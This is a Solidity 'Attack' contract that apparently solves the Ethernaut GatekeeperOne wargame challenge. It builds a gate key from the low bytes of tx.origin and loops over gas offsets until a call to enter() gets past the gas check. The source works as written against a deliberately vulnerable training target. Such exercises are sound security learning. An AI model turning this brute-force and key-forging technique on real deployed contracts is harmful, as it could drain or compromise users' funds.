// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract Attack {
    event Log(string message, uint number);
    event LogBytes(bytes data);

    bytes8 public pp = 0xa00000000000DDC4;
    // uint16(uint160( 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4 ))= 0xa00000000000ddc4;
    // 416
    // 0xa000000000005cb2
    // 0xa0000000000002db
    uint public number;
    IGatekeeperOne gate;

    constructor(address _calledContractAddress) {
        gate = IGatekeeperOne(_calledContractAddress);
    }

    function getProperInput() public view returns (bytes memory) {
        bytes memory result = abi.encodePacked(uint16(uint160(tx.origin)));
        return result;
    }

    function directAttack(bytes8 _pass, uint _gas) public {
        gate.enter{gas: (8191 * 10 + _gas)}(_pass);
    }

    function callmeToGetGas(bytes8 _pass) public returns (bool) {
        for (uint i = 100; i < 8191; i++) {
            try gate.enter{gas: (8191 * 10 + i)}(_pass) {
                number = i;
                emit Log("required aditional gas", number);
                return true;
            } catch {}
            // } catch Error(string memory reason) {
            //     // catch failing revert() and require()
            //     emit Log(reason);
            // } catch (bytes memory reason) {
            //     // catch failing assert()
            //     emit LogBytes(reason);
            // }
        }
        return false;

        // function callme(bytes8 _input) public returns(bool){
        // (bool result, ) = address(gate).call{gas: (8191 * 10 + 256)}(abi.encodeWithSignature("enter(bytes8)",_input));
    }
}
